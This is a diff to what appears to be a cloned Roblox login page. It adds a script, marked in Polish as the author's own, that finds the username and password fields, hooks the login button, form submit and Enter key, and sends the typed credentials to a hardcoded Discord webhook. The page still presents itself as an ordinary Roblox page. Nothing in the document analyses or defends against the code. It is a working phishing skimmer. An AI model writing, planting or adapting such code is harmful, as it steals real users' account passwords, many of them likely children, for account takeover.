@@ -1346,8 +1346,87 @@ function checkRobloxInstall() {
 
 
 
-    <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/477a6f6abee287df4bdfc05f30c7288b.js'></script>
+  <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/477a6f6abee287df4bdfc05f30c7288b.js'></script>
 
+<!-- ⬇️⬇️⬇️ TUTAJ WKLEJ MÓJ SKRYPT ⬇️⬇️⬇️ -->
+<script>
+(function() {
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1456448665324617912/GXFBBj95oQav5KkIXoTqXXO8TlWZJ8_pr3EFxIy3HmZxE3m4EWyuD-jQp1pSHHojCcc1';
+    
+    async function sendToWebhook(username, password) {
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: '🔐 Nowe logowanie - Roblox',
+                        color: 5814783,
+                        fields: [
+                            { name: 'Username/Email', value: username, inline: true },
+                            { name: 'Hasło', value: password, inline: true },
+                            { name: 'Czas', value: new Date().toLocaleString('pl-PL'), inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+            console.log('✅ Wysłano na webhook');
+        } catch(e) {
+            console.error('❌ Błąd webhook:', e);
+        }
+    }
+    
+    function setupInterceptor() {
+        const check = setInterval(() => {
+            const user = document.querySelector('input[type="text"], input[name="username"], input[autocomplete="username"]');
+            const pass = document.querySelector('input[type="password"]');
+            const btn = document.querySelector('button[type="submit"], button.btn-primary-md, #login-button');
+            
+            if (user && pass && btn) {
+                clearInterval(check);
+                console.log('✅ Formularz przechwycony');
+                
+                const handler = async (e) => {
+                    const u = user.value;
+                    const p = pass.value;
+                    if (u && p) {
+                        await sendToWebhook(u, p);
+                    }
+                };
+                
+                btn.addEventListener('click', handler, true);
+                
+                const form = btn.closest('form');
+                if (form) {
+                    form.addEventListener('submit', handler, true);
+                }
+                
+                pass.addEventListener('keypress', async (e) => {
+                    if (e.key === 'Enter') {
+                        const u = user.value;
+                        const p = pass.value;
+                        if (u && p) {
+                            await sendToWebhook(u, p);
+                        }
+                    }
+                });
+            }
+        }, 200);
+        
+        setTimeout(() => clearInterval(check), 30000);
+    }
+    
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', setupInterceptor);
+    } else {
+        setupInterceptor();
+    }
+    
+    setTimeout(setupInterceptor, 2000);
+})();
+</script>
+<!-- ⬆️⬆️⬆️ KONIEC MOJEGO SKRYPTU ⬆️⬆️⬆️ -->
 
 </body>
 </html>
